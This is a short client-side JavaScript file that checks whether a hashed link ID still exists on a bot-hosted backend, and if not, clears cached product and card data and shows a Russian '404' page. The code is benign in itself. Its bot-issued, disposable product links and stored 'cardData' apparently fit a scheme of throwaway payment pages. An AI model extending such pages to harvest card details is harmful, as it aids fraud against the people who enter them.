/**
 * Link Deletion Checker
 * Checks if link_id from query parameter exists in database
 * If deleted (404), shows 404 page instead of form
 */

document.addEventListener('DOMContentLoaded', function() {
    // Get link_id from hash (e.g., #enzxdp) not from query parameters
    const link_id = window.location.hash.slice(1);

    console.log('🔍 check-deleted.js loaded, link_id:', link_id);

    if (link_id && link_id.length >= 6) {
        // Check if link exists in database (wait 500ms for DB to save)
        // Note: check-link is a bot endpoint, not on frontend domain
        const API_URL = window.location.hostname === 'localhost'
            ? 'http://localhost:5000'
            : 'https://worker-production-740e.up.railway.app';

        setTimeout(() => {
            console.log(`🔗 Checking if link ${link_id} exists at ${API_URL}/check-link/${link_id}`);
            fetch(`${API_URL}/check-link/${link_id}`)
                .then(response => {
                    console.log(`📊 check-link response status: ${response.status}`);
                    if (response.status === 404) {
                        console.log(`🚫 Link is deleted: ${link_id}`);
                        show404Page();
                    } else {
                        console.log(`✅ Link exists: ${link_id}`);
                    }
                })
                .catch(error => {
                    console.error('❌ Error checking link:', error);
                    // On error, allow page to load (graceful fallback)
                });
        }, 500);
    } else {
        console.log('⚠️ No valid link_id found in hash');
    }
});

function show404Page() {
    // Clear all cached data for this link
    localStorage.removeItem('cachedProductData');
    localStorage.removeItem('lastProductName');
    localStorage.removeItem('cardData');

    document.body.innerHTML = `
        <div style="display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; background: #f5f5f5; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Arial;">
            <div style="text-align: center; background: white; padding: 40px; border-radius: 8px; box-shadow: 0 2px 8px rgba(0,0,0,0.1);">
                <h1 style="margin: 0 0 10px 0; color: #333; font-size: 48px;">404</h1>
                <p style="color: #666; margin: 0;">Ссылка больше не активна</p>
            </div>
        </div>
    `;
    document.title = '404 Not Found';
}
